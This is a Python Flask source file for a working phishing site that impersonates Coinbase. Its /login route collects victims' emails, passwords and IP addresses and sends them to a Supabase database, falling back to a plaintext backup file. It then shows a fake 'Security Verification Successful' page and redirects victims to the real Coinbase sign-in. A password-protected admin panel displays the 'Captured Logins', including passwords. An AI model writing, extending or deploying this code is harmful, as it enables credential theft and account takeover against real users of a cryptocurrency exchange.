from flask import Flask, request, redirect, session, render_template_string, send_from_directory
import datetime
import os
import requests as http_requests
import functools
import json

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'changeme')
SUPABASE_URL = "https://kbejfnprbyriyyalurpo.supabase.co"
SUPABASE_KEY = os.environ.get('SUPABASE_SECRET_KEY', '')

def supabase_headers():
    return {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }

def init_db():
    headers = supabase_headers()
    headers["Content-Type"] = "application/json"
    resp = http_requests.post(
        f"{SUPABASE_URL}/rest/v1/rpc/init_logins_table",
        headers=headers,
        json={}
    )
    if resp.status_code not in (200, 204):
        print(f"Note: Could not auto-create table via RPC ({resp.status_code}). Make sure the 'logins' table exists in Supabase.")
    else:
        print("Database table ready.")

try:
    init_db()
except Exception as e:
    print(f"DB init note: {e} — will attempt inserts anyway.")

@app.route('/coinbase-logo.png')
def serve_logo():
    return send_from_directory('.', 'coinbase-logo.png')

@app.route('/error')
def error_page():
    return '''
    <html>
    <head><title>Error</title>
    <style>
        body { font-family: 'Inter', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #fff; margin: 0; }
        .container { text-align: center; }
        h1 { font-size: 24px; color: #0A0B0D; margin-bottom: 8px; }
        p { color: #6B7280; font-size: 14px; }
    </style>
    </head>
    <body>
        <div class="container">
            <h1>Unexpected Error</h1>
            <p>Something went wrong. Please try again later.</p>
        </div>
    </body>
    </html>
    '''

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    data = {
        "ip_address": ip,
        "email": email,
        "password": password
    }

    try:
        resp = http_requests.post(
            f"{SUPABASE_URL}/rest/v1/logins",
            headers=supabase_headers(),
            json=data
        )
        if resp.status_code == 201:
            print(f"Logged to DB: {ip} | {email}")
        else:
            print(f"DB insert failed ({resp.status_code}): {resp.text}")
            with open("logins_backup.txt", "a") as f:
                f.write(f"{timestamp} | {ip} | {email} | {password}\n")
    except Exception as e:
        print(f"DB error: {e} — saving to backup file")
        with open("logins_backup.txt", "a") as f:
            f.write(f"{timestamp} | {ip} | {email} | {password}\n")

    return """
    <html>
        <head>
            <title>Redirecting...</title>
            <meta http-equiv="refresh" content="3;url=https://www.coinbase.com/signin">
        </head>
        <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
            <div style="max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
                <h2 style="color: #0052FF;">Security Verification Successful</h2>
                <p>Redirecting you to Coinbase safely...</p>
                <p style="font-size: 12px; color: #666;">If you are not redirected automatically, <a href="https://www.coinbase.com/signin">click here</a>.</p>
            </div>
        </body>
    </html>
    """

def login_required(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect('/admin/login')
        return f(*args, **kwargs)
    return decorated

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    error = ''
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect('/admin')
        error = 'Incorrect password.'

    return render_template_string('''
    <html>
    <head><title>Admin Login</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f5f5; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #333; color: white; border: none; border-radius: 6px; cursor: pointer; }
        .error { color: red; font-size: 14px; }
    </style>
    </head>
    <body>
        <div class="card">
            <h2>Admin Access</h2>
            {% if error %}<p class="error">{{ error }}</p>{% endif %}
            <form method="POST">
                <input type="password" name="password" placeholder="Enter admin password" required>
                <button type="submit">Sign In</button>
            </form>
        </div>
    </body>
    </html>
    ''', error=error)

@app.route('/admin')
@login_required
def admin_panel():
    resp = http_requests.get(
        f"{SUPABASE_URL}/rest/v1/logins?select=*&order=created_at.desc",
        headers=supabase_headers()
    )

    rows = []
    if resp.status_code == 200:
        rows = resp.json()
    else:
        print(f"Failed to fetch logins: {resp.status_code} {resp.text}")

    return render_template_string('''
    <html>
    <head><title>Admin Panel - Logins</title>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        th { background: #333; color: white; padding: 12px 16px; text-align: left; }
        td { padding: 10px 16px; border-bottom: 1px solid #eee; }
        tr:hover { background: #f9f9f9; }
        .count { background: #333; color: white; padding: 4px 12px; border-radius: 20px; font-size: 14px; }
        a { color: #333; text-decoration: none; padding: 6px 14px; border: 1px solid #ccc; border-radius: 6px; }
        .empty { text-align: center; padding: 40px; color: #999; }
    </style>
    </head>
    <body>
        <div class="header">
            <h2>Captured Logins <span class="count">{{ rows|length }}</span></h2>
            <a href="/admin/logout">Logout</a>
        </div>
        {% if rows %}
        <table>
            <tr><th>#</th><th>Time</th><th>IP Address</th><th>Email</th><th>Password</th></tr>
            {% for row in rows %}
            <tr>
                <td>{{ row.get('id', '') }}</td>
                <td>{{ row.get('created_at', '') }}</td>
                <td>{{ row.get('ip_address', '') }}</td>
                <td>{{ row.get('email', '') }}</td>
                <td>{{ row.get('password', '') }}</td>
            </tr>
            {% endfor %}
        </table>
        {% else %}
        <div class="empty"><p>No logins captured yet.</p></div>
        {% endif %}
    </body>
    </html>
    ''', rows=rows)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect('/admin/login')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
